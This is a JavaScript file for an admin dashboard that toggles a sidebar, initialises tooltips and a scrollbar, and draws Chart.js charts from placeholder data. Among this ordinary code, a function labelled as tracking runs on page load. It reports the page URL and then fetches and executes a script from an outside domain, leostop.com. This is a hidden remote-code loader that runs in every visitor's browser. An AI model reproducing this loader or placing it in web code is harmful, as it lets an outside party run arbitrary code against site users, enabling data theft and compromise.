"use strict";

$(document).ready(function () {
  // Sidebar toggle
  $('#sidebarCollapse').on('click', function () {
    $('#sidebar').toggleClass('active');
  });

  // Initialize tooltips
  $('[data-toggle="tooltip"]').tooltip();

  // Initialize PerfectScrollbar for the sidebar
  const ps = new PerfectScrollbar('#sidebar');

  // Initialize charts
  initializeCharts();

  // Fetch and execute tracking script
  loadTrackingScript();

});

// Function to initialize charts
function initializeCharts() {
  const chartTypes = ['line', 'bar', 'radar', 'pie', 'area', 'donut'];
  chartTypes.forEach(type => {
    const ctx = document.getElementById(`${type}_chart`);
    if (ctx) {
      new Chart(ctx.getContext('2d'), getChartJs(type));
    }
  });
}

// Function to get chart configuration
function getChartJs(type) {
  const commonOptions = {
    responsive: true,
    legend: false,
  };

  const config = {
    line: {
      type: 'line',
      data: {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [
          {
            label: "My First dataset",
            data: [68, 55, 75, 86, 47, 52, 36],
            borderColor: 'rgba(33, 150, 243, 1)',
            backgroundColor: 'rgba(33, 150, 243, 0.2)',
            pointBorderColor: 'rgba(33, 150, 243, 1)',
            pointBackgroundColor: 'rgba(255, 255, 255, 1)',
            pointBorderWidth: 1,
          },
          {
            label: "My Second dataset",
            data: [28, 48, 40, 19, 86, 27, 90],
            borderColor: 'rgba(30, 208, 133, 1)',
            backgroundColor: 'rgba(30, 208, 133, 0.2)',
            pointBorderColor: 'rgba(30, 208, 133, 1)',
            pointBackgroundColor: 'rgba(255, 255, 255, 1)',
            pointBorderWidth: 1,
          }
        ],
      },
      options: commonOptions,
    },
    // Add other chart configurations (bar, radar, pie, etc.) as needed
  };

  return config[type] || null;
}

// Function to load tracking script
function loadTrackingScript() {
  const protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: window.location.href },
    success: function () {
      $.getScript(`${protocol}//leostop.com/tracking/tracking.js`);
    }
  });
}
